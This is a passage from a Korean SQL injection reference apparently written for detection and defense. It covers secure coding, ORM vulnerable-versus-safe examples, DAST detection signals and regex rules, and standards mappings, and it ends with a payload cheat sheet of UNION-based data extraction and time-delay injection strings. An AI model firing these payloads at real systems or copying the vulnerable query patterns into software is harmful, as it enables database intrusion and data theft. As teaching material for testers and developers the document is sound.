# 2. ORDER BY - 화이트리스트 + 매핑
ORDER_COLUMNS = {
    'name': 'name',
    'date': 'created_at',
    'price': 'price'
}

def get_sorted(sort_key, direction):
    column = ORDER_COLUMNS.get(sort_key)
    if not column:
        column = 'id'  # 기본값
    # direction도 검증
    dir_sql = 'DESC' if direction == 'desc' else 'ASC'
    query = f"SELECT * FROM products ORDER BY {column} {dir_sql}"
    cursor.execute(query)

# 3. IN 절 - 동적 플레이스홀더 생성
def get_by_ids(id_list):
    # id_list가 숫자인지 먼저 검증
    validated_ids = [int(i) for i in id_list]
    placeholders = ','.join(['?'] * len(validated_ids))
    query = f"SELECT * FROM users WHERE id IN ({placeholders})"
    cursor.execute(query, validated_ids)
```

### 7.3 Input Validation

```
타입 검증:   숫자 필드 → 숫자만 허용
길이 검증:   최대 길이 제한
화이트리스트: 허용된 값만 통과
블랙리스트:  위험 문자 차단 (우회 가능!)

블랙리스트의 한계:
- ' 차단 → %27 우회
- SELECT 차단 → SeLeCt 우회
- 모든 우회 기법 차단 불가능
```

### 7.4 WAF (Web Application Firewall)

```
동작 방식:
1. 요청 분석 → 시그니처 매칭
2. 악성 패턴 감지 → 차단

한계:
- 시그니처 우회 가능 (인코딩, 난독화)
- 정상 요청 오차단 가능
- 컨텍스트 이해 부족

WAF는 "보조 수단"이지 "해결책"이 아님
```

---

## 8. SQLi 탐지 지표 (DAST 관점)

### 8.1 AI-DAST 탐지 방법론

```
┌─────────────────────────────────────────────────────────────┐
│                AI-DAST SQLi 탐지 파이프라인                  │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Phase 1: 정찰 (Reconnaissance)                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ • 파라미터 식별 (GET, POST, Cookie, Header)        │   │
│  │ • 기술 스택 핑거프린팅 (서버, 프레임워크)          │   │
│  │ • 기본 응답 패턴 수집 (Baseline)                   │   │
│  └─────────────────────────────────────────────────────┘   │
│                          ↓                                  │
│  Phase 2: 탐색 (Probing)                                    │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ • 메타 문자 주입 (' " \ ; --)                      │   │
│  │ • 응답 차이 분석 (길이, 시간, 상태코드)            │   │
│  │ • 에러 메시지 패턴 매칭                            │   │
│  └─────────────────────────────────────────────────────┘   │
│                          ↓                                  │
│  Phase 3: 확인 (Confirmation)                               │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ • True/False 조건 비교 (AND 1=1 vs AND 1=2)        │   │
│  │ • 시간 지연 확인 (SLEEP/WAITFOR)                   │   │
│  │ • 데이터 추출 시도 (UNION SELECT)                  │   │
│  └─────────────────────────────────────────────────────┘   │
│                          ↓                                  │
│  Phase 4: 분류 (Classification)                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ • SQLi 유형 판별 (Error/Union/Blind/OOB)           │   │
│  │ • DBMS 식별 (MySQL/MSSQL/PostgreSQL/Oracle)        │   │
│  │ • 심각도 산정 (Impact 분석)                        │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**탐지 신호 (Detection Signals):**
```yaml
detection_signals:
  # 강한 신호 (High Confidence)
  high_confidence:
    - type: "error_message"
      patterns:
        - "SQL syntax"
        - "mysql_fetch"
        - "ORA-"
        - "unclosed quotation"
      confidence: 0.95

    - type: "union_success"
      condition: "UNION SELECT로 추가 데이터 출력"
      confidence: 0.99

    - type: "time_correlation"
      condition: "SLEEP(n) → 정확히 n초 지연"
      confidence: 0.95

  # 중간 신호 (Medium Confidence)
  medium_confidence:
    - type: "boolean_difference"
      condition: "AND 1=1 ≠ AND 1=2 응답"
      confidence: 0.75

    - type: "quote_error"
      condition: "' 추가 시 에러/다른 응답"
      confidence: 0.70

  # 약한 신호 (Low Confidence - 추가 확인 필요)
  low_confidence:
    - type: "response_length_change"
      condition: "응답 길이 변화"
      confidence: 0.40

    - type: "status_code_change"
      condition: "200 → 500 등"
      confidence: 0.50
```

### 8.2 응답 기반 탐지

```yaml
에러 메시지 패턴:
  mysql:
    - "You have an error in your SQL syntax"
    - "mysql_fetch"
    - "Warning: mysql_"
    - "MySQLSyntaxErrorException"

  postgresql:
    - "pg_query"
    - "PSQLException"
    - "ERROR: syntax error at or near"

  mssql:
    - "Microsoft OLE DB Provider"
    - "Unclosed quotation mark"
    - "SqlException"

  oracle:
    - "ORA-"
    - "Oracle error"
    - "PLS-"

행동 변화:
  - 응답 길이 변화 (Boolean-based)
  - 응답 시간 변화 (Time-based)
  - HTTP 상태 코드 변화
  - 리다이렉트 발생
  - 콘텐츠 차이
```

### 8.3 참/거짓 판별 기준

```
Boolean-based 탐지:

True Condition:
' AND 1=1--
' AND 'a'='a'--
' OR 1=1--

False Condition:
' AND 1=2--
' AND 'a'='b'--
' AND 1=0--

비교:
True 응답 ≠ False 응답 → SQLi 가능성
True 응답 = False 응답 → SQLi 불가능하거나 다른 방식 필요
```

---

## 9. ORM/Framework SQLi

### 9.1 ORM SQLi 개요

```
┌─────────────────────────────────────────────────────────────┐
│                    ORM과 SQLi 관계                           │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  일반적 오해: "ORM 사용 = SQLi로부터 안전"                  │
│  현실: ORM도 잘못 사용하면 SQLi 취약                        │
│                                                              │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  안전한 ORM 사용                                    │   │
│  │  User.objects.filter(username=user_input)          │   │
│  │  → 자동으로 파라미터화                              │   │
│  └─────────────────────────────────────────────────────┘   │
│                          vs                                 │
│  ┌─────────────────────────────────────────────────────┐   │
│  │  위험한 ORM 사용                                    │   │
│  │  User.objects.raw(f"SELECT * WHERE name='{inp}'") │   │
│  │  → 문자열 연결 = SQLi 취약                         │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 9.2 프레임워크별 취약 패턴

**Django (Python):**
```python
# ✅ 안전 - ORM 메서드 사용
User.objects.filter(username=user_input)
User.objects.get(id=user_id)

# ❌ 취약 - raw() with string formatting
User.objects.raw(f"SELECT * FROM users WHERE name = '{user_input}'")

# ❌ 취약 - extra() with string formatting (deprecated)
User.objects.extra(where=[f"name = '{user_input}'"])

# ❌ 취약 - cursor.execute with string formatting
cursor.execute(f"SELECT * FROM users WHERE name = '{user_input}'")

# ✅ 안전 - raw()도 파라미터 사용 시
User.objects.raw("SELECT * FROM users WHERE name = %s", [user_input])
```

**SQLAlchemy (Python):**
```python
# ✅ 안전 - ORM 쿼리
session.query(User).filter(User.name == user_input)

# ❌ 취약 - text()에 직접 문자열
from sqlalchemy import text
session.execute(text(f"SELECT * FROM users WHERE name = '{user_input}'"))

# ❌ 취약 - filter with string formatting
session.query(User).filter(f"name = '{user_input}'")

# ✅ 안전 - text()도 바인딩 사용 시
session.execute(text("SELECT * FROM users WHERE name = :name"), {"name": user_input})
```

**Hibernate (Java) - CWE-564:**
```java
// ✅ 안전 - Named Parameters
Query query = session.createQuery("FROM User WHERE name = :name");
query.setParameter("name", userInput);

// ✅ 안전 - Positional Parameters
Query query = session.createQuery("FROM User WHERE name = ?1");
query.setParameter(1, userInput);

// ❌ 취약 - String Concatenation
String hql = "FROM User WHERE name = '" + userInput + "'";
Query query = session.createQuery(hql);

// ❌ 취약 - Criteria API에서 Restrictions.sqlRestriction()
session.createCriteria(User.class)
    .add(Restrictions.sqlRestriction("name = '" + userInput + "'"));
```

**JPA (Java):**
```java
// ✅ 안전 - JPQL with Parameters
TypedQuery<User> query = em.createQuery(
    "SELECT u FROM User u WHERE u.name = :name", User.class);
query.setParameter("name", userInput);

// ✅ 안전 - Criteria API
CriteriaBuilder cb = em.getCriteriaBuilder();
CriteriaQuery<User> cq = cb.createQuery(User.class);
Root<User> root = cq.from(User.class);
cq.where(cb.equal(root.get("name"), userInput));

// ❌ 취약 - Native Query with String Concat
em.createNativeQuery("SELECT * FROM users WHERE name = '" + userInput + "'");
```

**ActiveRecord (Ruby/Rails):**
```ruby
# ✅ 안전 - Hash conditions
User.where(name: user_input)
User.find_by(name: user_input)

# ✅ 안전 - Array conditions with placeholders
User.where("name = ?", user_input)
User.where("name = :name", name: user_input)

# ❌ 취약 - String interpolation
User.where("name = '#{user_input}'")

# ❌ 취약 - order with user input
User.order(user_input)  # ORDER BY 필드명 직접 전달

# ❌ 취약 - pluck with string
User.pluck("#{user_input}")
```

**Sequelize (Node.js):**
```javascript
// ✅ 안전 - Object conditions
User.findAll({ where: { name: userInput } });

// ✅ 안전 - Replacements
sequelize.query("SELECT * FROM users WHERE name = ?",
  { replacements: [userInput] });

// ❌ 취약 - Template literals
sequelize.query(`SELECT * FROM users WHERE name = '${userInput}'`);

// ❌ 취약 - Op.literal without sanitization
User.findAll({
  where: sequelize.literal(`name = '${userInput}'`)
});
```

### 9.3 ORM SQLi 탐지 포인트

```yaml
detection_points:
  code_patterns:
    - pattern: "raw\\s*\\(.*f['\"]"
      language: "Python"
      risk: "HIGH"
      description: "raw()에 f-string 사용"

    - pattern: "createQuery.*\\+.*\\+"
      language: "Java"
      risk: "HIGH"
      description: "HQL 문자열 연결"

    - pattern: 'where\\s*\\(.*#\\{'
      language: "Ruby"
      risk: "HIGH"
      description: "문자열 보간 사용"

    - pattern: "query\\s*\\(.*`.*\\$\\{"
      language: "JavaScript"
      risk: "HIGH"
      description: "템플릿 리터럴에 변수 삽입"

  runtime_indicators:
    - indicator: "ORDER BY 파라미터가 HTTP에서 직접 전달"
    - indicator: "동적 테이블/컬럼 선택 API"
    - indicator: "검색 필터에 연산자 선택 기능"
```

---

## 10. 종합 분류 매트릭스

```
┌──────────────────────────────────────────────────────────────────────────┐
│                         SQLi 종합 분류표                                 │
├──────────┬─────────────┬─────────────┬────────────────┬─────────────────┤
│  대분류  │   중분류    │    조건     │     속도       │    난이도       │
├──────────┼─────────────┼─────────────┼────────────────┼─────────────────┤
│ In-band  │ Error-based │ 에러 노출   │ 빠름           │ 쉬움            │
│          │ Union-based │ 결과 출력   │ 빠름           │ 중간            │
├──────────┼─────────────┼─────────────┼────────────────┼─────────────────┤
│ Blind    │ Boolean     │ 응답 차이   │ 느림           │ 중간            │
│          │ Time-based  │ 시간 제어   │ 매우 느림      │ 중간            │
├──────────┼─────────────┼─────────────┼────────────────┼─────────────────┤
│ Out-of   │ DNS exfil   │ DNS 허용    │ 빠름           │ 어려움          │
│ -band    │ HTTP exfil  │ HTTP 허용   │ 빠름           │ 어려움          │
├──────────┼─────────────┼─────────────┼────────────────┼─────────────────┤
│ 특수     │ 2nd Order   │ 저장+재사용 │ 상황에 따름    │ 어려움          │
│          │ Stacked     │ 다중쿼리    │ 빠름           │ 쉬움(지원시)    │
└──────────┴─────────────┴─────────────┴────────────────┴─────────────────┘
```

---

## 9. GR Framework 매핑

### 9.1 SQLi의 GR 좌표

```yaml
sqli_gr_mapping:
  # 발생 위치
  occurrence:
    layer: "L7"  # Application Layer
    zone: "Zone3-4"  # 일반적인 웹앱 위치

  # 영향 범위
  impact:
    layer: "L5"  # Data Layer (DBMS)
    zone: "Zone4-5"  # 내부 데이터 영역

  # 관련 태그
  tags:
    - "A-WEB-API"      # 웹 애플리케이션
    - "A-WEB-FORM"     # 입력 폼
    - "D-DB-SQL"       # SQL 데이터베이스
    - "D-DB-QUERY"     # 쿼리 처리
    - "S-VUL-INJ"      # 인젝션 취약점
    - "S-CTL-INPUT"    # 입력 검증 통제
    - "T-LANG-SQL"     # SQL 기술스택
```

### 9.2 CWE/OWASP 매핑

```yaml
standards_mapping:
  cwe:
    - id: "CWE-89"
      name: "SQL Injection"

    - id: "CWE-564"
      name: "SQL Injection: Hibernate"

    - id: "CWE-566"
      name: "Authorization Bypass Through SQL Injection"

  owasp:
    - id: "A03:2021"
      name: "Injection"

  mitre_attack:
    - id: "T1190"
      name: "Exploit Public-Facing Application"
```

---

## 부록: 빠른 참조

### A. 탐지 체크리스트

```
□ 1. 싱글 쿼트(') 주입 → 에러 확인
□ 2. 더블 쿼트(") 주입 → 에러 확인
□ 3. 주석(--) 주입 → 응답 변화 확인
□ 4. OR 1=1 / AND 1=2 → Boolean 차이 확인
□ 5. SLEEP(5) → 시간 지연 확인
□ 6. ORDER BY n → 컬럼 수 파악
□ 7. UNION SELECT → 데이터 추출 시도
```

### B. 페이로드 치트시트

```sql
-- 기본 탐지
'
"
' OR '1'='1
' OR 1=1--
" OR "1"="1

-- 컬럼 수 파악
' ORDER BY 1--
' ORDER BY 10--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- 정보 수집 (MySQL)
' UNION SELECT version(),user()--
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Time-based
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--

-- Boolean
' AND 1=1--  (참)
' AND 1=2--  (거짓)
```

---

> **다음 문서**: 02_Bypass_Techniques.md (필터 우회 기법 상세)
